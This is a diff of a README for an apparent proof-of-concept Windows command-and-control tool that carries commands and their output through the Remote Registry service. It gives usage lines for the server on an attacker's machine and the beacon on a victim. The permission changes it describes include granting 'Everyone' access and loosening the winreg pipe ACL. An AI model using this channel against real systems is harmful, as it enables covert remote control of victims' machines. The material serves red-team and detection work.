@@ -28,27 +28,28 @@ The permissions allows for anyone to connect to the servers registry database. E
 
 ### How it works:
 1. When the server starts, the Remote Registry Service is enabled and started. 
-2. The registry key HKEY_LOCAL_MACHINE\Software\RegistryC2\<user-defined> is created along with the following registry values: cmd, output & sleep. Think of this used defined registry key as the port (LHOST).
-3. Permissions are then set for the user "Everyone" on the newly created registry key.
-4. Permissions are likewise set on the key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg. This ensures that any client can authenticate to the server. (N.B. On exiting/closing of the server, these permissions are removed again.) 
-5. The client will connect to the C2 server using WinReg, and read the newly created registry key for the value of "sleep", to determine how often to check-in. 
-6. When it is time to check-in, the client executes the command found in the "cmd"-value. 
-7. The result of the command is written as a string to the C2's registry keys "output" value. 
+2. The registry key HKEY_LOCAL_MACHINE\Software\RegistryC2\<user-defined> is created along with the following registry values: cmd, output & sleep. The user-defined registry key is specific to a single beacon and could be compared to setting up a listener.
+3. Read/Write permissions are then set for the user "Everyone" on the newly created registry key.
+4. Permissions are likewise set on the key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg. This ensures that any client can authenticate to the server. (Note that, on exiting/closing the server, these permissions are removed again.) 
+5. When executing the beacon on the victim machine, it will connect to the C2 server using the WinReg protocol, and read the newly created registry key for the value of "sleep", to determine how often to check-in. 
+6. When the timer is up, the client checks-in and executes the command found in the "cmd"-value. 
+7. The result of the command is written as a string to the "output" value. 
 8. While running, the server will look for new updates to the "output" value and prints it back to the attacker.
+9. The attacker can now run a new command if he/she wants to.
 
 ### Usage:
 **Setup the server on the attackers machine (listener/C2):**
 ``` 
 RegC2Server.exe <Registry key name to use with the client>
-RegC2Server.exe victim01
+Example: RegC2Server.exe victim01
 ```
 **Starting the client on the victim (beacon):**
 ```
 RegC2Client.exe <host> <Registry key name used to start the server>
-RegC2Client.exe ws01 victim01
+Example: RegC2Client.exe ws01 victim01
 ```
 
-**Since this is a POC, only the following commands have been implemented:**
+**Since this is a PoC, only the following commands have been implemented:**
 ```
 >help
 sleep <int>      Set the sleep time to the value of int
@@ -57,10 +58,7 @@ exit             Exit the application gracefully
 ```
 
 
-### Screenshot:
+### Screenshots:
 ![client_start](https://user-images.githubusercontent.com/35890107/186356461-715947b2-5926-40fe-9d9f-2264ebe20476.png)
 
 
-Win32 apis 
-
-Wireshark traffic
